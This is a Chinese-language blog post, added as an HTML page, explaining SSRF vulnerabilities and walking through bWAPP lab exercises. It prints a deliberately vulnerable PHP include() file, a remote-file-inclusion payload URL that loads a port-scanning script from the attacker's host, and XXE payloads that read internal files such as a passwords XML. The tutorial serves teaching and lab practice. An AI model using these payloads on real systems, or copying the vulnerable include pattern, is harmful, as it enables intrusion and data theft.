@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml" />
+
+
+
+  <meta name="keywords" content="ssrf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="ssrf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf">
+<meta property="og:url" content="http://yoursite.com/2018/11/22/ssrf/index.html">
+<meta property="og:site_name" content="绝世狂龙">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-fffe295033ada8c7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-290d7b3855d9454c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-4a95f6eb126fe985.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-0b505ca4ead13e95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-643c7214c5089349.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-9298e642dd8786cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-2b93e3a39f45608b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-6134a4d4d6dff939.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-4028a5e670b3c276.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-3acdb6eaca9e095e.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-c62b734547b8246d.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-466c4a799e902c31.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-11-22T12:33:40.476Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ssrf">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9113981-fffe295033ada8c7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/22/ssrf/"/>
+
+
+
+
+
+
+  <title>ssrf | 绝世狂龙</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">绝世狂龙</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">今天很残酷，明天更残酷，但后天会很美好！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友情链接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/ssrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="berlin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/zhenzhen.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="绝世狂龙">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ssrf</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T20:21:19+08:00">
+                2018-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ssrf/" itemprop="url" rel="index">
+                    <span itemprop="name">ssrf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://upload-images.jianshu.io/upload_images/9113981-fffe295033ada8c7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1542335723101.jpg"><br><a id="more"></a></p>
+<h2 id="SSRF漏洞是如何产生的？"><a href="#SSRF漏洞是如何产生的？" class="headerlink" title="SSRF漏洞是如何产生的？"></a>SSRF漏洞是如何产生的？</h2><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</strong></p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
+<p> 上面的话说的有点抽象，然后说一下网上大佬的理解</p>
+<p> 首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。</p>
+<p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。</p>
+<p><strong>正常用户访问网站的流程是：</strong></p>
+<p>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应</p>
+<p>【那网站有个请求是<a href="http://www.baidu,com/xxx.php?image=URL】" target="_blank" rel="noopener">www.baidu,com/xxx.php?image=URL】</a></p>
+<p>那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性</p>
+<p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据</p>
+<p>例如：</p>
+<p><a href="http://www.baidu.com/xxx.php?image=www.abc.com/1.jpg" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=www.abc.com/1.jpg</a></p>
+<p>如果我们将<a href="http://www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p>
+<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
+<p>终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p>
+<h4 id="ssrf用途"><a href="#ssrf用途" class="headerlink" title="ssrf用途"></a>ssrf用途</h4><p>那么SSRF 可以做什么呢？</p>
+<p><strong>1.内外网的端口和服务扫描</strong></p>
+<p><strong>2.主机本地敏感数据的读取</strong></p>
+<p><strong>3.内外网主机应用程序漏洞的利用</strong></p>
+<p><strong>4.内外网Web站点漏洞的利用</strong></p>
+<p><strong>……</strong></p>
+<h4 id="SSRF漏洞的寻找（漏洞常见出没位置）："><a href="#SSRF漏洞的寻找（漏洞常见出没位置）：" class="headerlink" title="SSRF漏洞的寻找（漏洞常见出没位置）："></a>SSRF漏洞的寻找（漏洞常见出没位置）：</h4><p>注：个人觉得所有调外部资源的参数都有可能存在ssrf漏洞</p>
+<ul>
+<li><p>1）分享：通过URL地址分享网页内容</p>
+</li>
+<li><p>2）转码服务</p>
+</li>
+<li><p>3）在线翻译</p>
+</li>
+<li><p>4）图片加载与下载：通过URL地址加载或下载图片</p>
+</li>
+<li><p>5）图片、文章收藏功能</p>
+</li>
+<li><p>6）未公开的api实现以及其他调用URL的功能</p>
+</li>
+<li><p>7）从URL关键字中寻找</p>
+</li>
+</ul>
+<p>　　<br>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>3g<br>display<br>sourceURl<br>imageURL<br>domain<br>…</p>
+<h4 id="SSRF漏洞的验证方法："><a href="#SSRF漏洞的验证方法：" class="headerlink" title="SSRF漏洞的验证方法："></a>SSRF漏洞的验证方法：</h4><p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
+<p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a></p>
+<h2 id="SSRF实例"><a href="#SSRF实例" class="headerlink" title="SSRF实例"></a>SSRF实例</h2><h4 id="1-bWAPP中的SSRF"><a href="#1-bWAPP中的SSRF" class="headerlink" title="1. bWAPP中的SSRF"></a>1. bWAPP中的SSRF</h4><p>bWAPP(buggy web Application) 这是一个集成了各种常见漏洞和最新漏洞的开源Web应用程序，集成了超过100种漏洞，个人觉得还是非常好用的，特别是在找漏洞利用示例的时候，往往能够节省一些时间。 </p>
+<p>BWAPP：一款非常好用的漏洞演示平台 </p>
+<p>安装完毕后，使用bee/bug进行登录，登录的时候的等级选择为low，登录后选择SSRF的靶场，然后点击Hack进行演练。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-290d7b3855d9454c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>选择ssrf测试</p>
+<h4 id="2-SSRF的3个小实验"><a href="#2-SSRF的3个小实验" class="headerlink" title="2. SSRF的3个小实验"></a>2. SSRF的3个小实验</h4><p>bWAPP中的SSRF给出了3个小实验来说明SSRF的利用场景:</p>
+<p>任务1：使用(RFI)远程文件包含进行端口扫描（内网探测）</p>
+<p>任务2：使用XXE获取敏感文件中的内容（文件读取）</p>
+<p>任务3：使用XXE进行SmartTV的拒绝服务漏洞的利用（漏洞利用）</p>
+<p><strong>RFI综述</strong></p>
+<p>RFI是Remote File Inclusion的英文缩写，直译过来就是远程文件包含，文件包含的目的是：程序员编写程序时，经常会把需要重复使用的代码写入一个单独的文件中，当需要调用这些代码时，再在其他文件中包含调用代码的文件。<br>要了解远程文件包含，首要先了解php的文件包含机制：<br>PHP中常用的包含调用函数有：include(), require(), include_once(), require_once() .include失败会弹出警告 而require则直接导致致命的错误<br>写个例子吧，直接讲下RFI：<br>s_hell.php（php.ini下开启allow_url_fopen  allow_url_include）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="http-10-22-10-191-Myphp-s-hell-php-file-https-bbs-ichunqiu-com"><a href="#http-10-22-10-191-Myphp-s-hell-php-file-https-bbs-ichunqiu-com" class="headerlink" title="http://10.22.10.191/Myphp/s_hell.php?file=https://bbs.ichunqiu.com"></a><code>http://10.22.10.191/Myphp/s_hell.php?file=https://bbs.ichunqiu.com</code></h1><p><img src="https://upload-images.jianshu.io/upload_images/9113981-4a95f6eb126fe985.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>包含其实通俗点来讲，就是把被包含的文件的代码拿过来当作自己的源码的一部分，所以，php文件包含机制有个特性：哪怕被包含的文件是个txt文件，它也会被包含文件所在的服务器当作脚本去执行：</p>
+<p><strong>任务1：使用远程文件包含进行端口扫描</strong></p>
+<p>点击任务1中的Port scan可以获得一份端口扫描的攻击脚本<br><img src="https://upload-images.jianshu.io/upload_images/9113981-0b505ca4ead13e95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><a href="http://10.22.10.191/Myphp/ssrf-1.txt" target="_blank" rel="noopener">http://10.22.10.191/Myphp/ssrf-1.txt</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bWAPP, or a buggy web application, is a free and open source deliberately insecure web application.</span></span><br><span class="line"><span class="comment">It helps security enthusiasts, developers and students to discover and to prevent web vulnerabilities.</span></span><br><span class="line"><span class="comment">bWAPP covers all major known web vulnerabilities, including all risks from the OWASP Top 10 project!</span></span><br><span class="line"><span class="comment">It is for educational purposes only.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Enjoy!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malik Mesellem</span></span><br><span class="line"><span class="comment">Twitter: <span class="doctag">@MME</span>_IT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">漏 2013 MME BVBA. All rights reserved.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert(\"U 4r3 0wn3d by MME!!!\");&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    $ports = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);  <span class="comment">//要扫描的端口</span></span><br><span class="line">    </span><br><span class="line">    $results = <span class="keyword">array</span>();        <span class="comment">//把端口开放结果存在数组里</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>($ports <span class="keyword">as</span> $port)           <span class="comment">//遍历端口</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($pf = @fsockopen($_REQUEST[<span class="string">"ip"</span>], $port, $err, $err_string, <span class="number">1</span>))          <span class="comment">//fsockopen()判断端口开放情况</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">true</span>;         <span class="comment">//结果放置在result数组里</span></span><br><span class="line">            fclose($pf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">false</span>;        </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span>($results <span class="keyword">as</span> $port=&gt;$val)             <span class="comment">//遍历结果数组 $port=&gt;$val 键值对形式</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $prot = getservbyport($port,<span class="string">"tcp"</span>);        /获取端口服务</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Port $port ($prot): "</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($val)                  <span class="comment">//存在结果数组里的值是true，即为端口open，否则端口close</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>进入Remote &amp; Local File Inclusion (RFI/LFI)的实验后，看到有个选择语言的功能模块，直接执行下，观察Get请求中的参数，发现是典型文件包含问题，language=lang_en.php </p>
+<p>GET的请求： <a href="http://127.0.0.1/bwapp/bWAPP/rlfi.php?language=http://10.22.10.191/Myphp/ssrf-1.txt&amp;action=go" target="_blank" rel="noopener">http://127.0.0.1/bwapp/bWAPP/rlfi.php?language=http://10.22.10.191/Myphp/ssrf-1.txt&amp;action=go</a><br><a href="http://image.3001.net/images/20171218/15135805934747.png" target="_blank" rel="noopener"><img src="http://upload-images.jianshu.io/upload_images/9113981-643c7214c5089349.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="请求.png"></a> </p>
+<p>使用如下PAYLOAD，远程包含并执行扫描脚本探测内网主机的端口和服务。</p>
+<blockquote>
+<p>POST：<a href="http://10.22.10.191/bwapp/bWAPP/rlfi.php?language=http://10.22.10.191/Myphp/ssrf-1.txt&amp;action=go" target="_blank" rel="noopener">http://10.22.10.191/bwapp/bWAPP/rlfi.php?language=http://10.22.10.191/Myphp/ssrf-1.txt&amp;action=go</a></p>
+<p>POST DATA：ip=10.22.8.113</p>
+</blockquote>
+<p>10.22.10.191也就是攻击者的主机ip，这里language=<a href="http://10.22.10.191/....是扫描脚本的访问地址，为了方便这里就用同一台进行测试了，10.22.8.113是要扫描的目标主机地址，且该地址是language=http://10.22.10.191/主机无法访问到的，然后方便查看区分使用post请求提交要进行扫描的目标主机IP，扫描结束后便返回结果。" target="_blank" rel="noopener">http://10.22.10.191/....是扫描脚本的访问地址，为了方便这里就用同一台进行测试了，10.22.8.113是要扫描的目标主机地址，且该地址是language=http://10.22.10.191/主机无法访问到的，然后方便查看区分使用post请求提交要进行扫描的目标主机IP，扫描结束后便返回结果。</a></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-9298e642dd8786cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><strong>任务2：使用XXE获取敏感文件中的内容</strong><br><img src="https://upload-images.jianshu.io/upload_images/9113981-2b93e3a39f45608b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>先点击任务2中的Access得到XXE的利用脚本<a href="http://127.0.0.1/BWAPP/evil/ssrf-2.txt。，然后访问XML" target="_blank" rel="noopener">http://127.0.0.1/BWAPP/evil/ssrf-2.txt。，然后访问XML</a> External Entity Attacks (XXE)演练环境<a href="http://xxx.xxx.xxx/bWAPP/xxe-1.php" target="_blank" rel="noopener">http://xxx.xxx.xxx/bWAPP/xxe-1.php</a>，使用burpSuite抓包，并发送到repeater中进行测试。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Accesses a file on the internal network (1)</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>&amp;bWAPP;<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Accesses a file on the internal network (2)</span><br><span class="line"># Web pages returns some characters that break the XML schema &gt; use the PHP base64 encoder filter to return an XML schema friendly version of the page!</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>&amp;bWAPP;<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>测试中涉及的XXE知识可以参考<a href="http://mp.weixin.qq.com/s/Yt7s-OoGMilCs-Yvyjl1xA" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/Yt7s-OoGMilCs-Yvyjl1xA</a>这篇文章。</p>
+<p><a href="http://image.3001.net/images/20171218/15135807491103.png" target="_blank" rel="noopener"><img src="http://upload-images.jianshu.io/upload_images/9113981-6134a4d4d6dff939.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="任务2 1.png"></a> </p>
+<p>使用http协议获取/bWAPP/robots.txt的内容。</p>
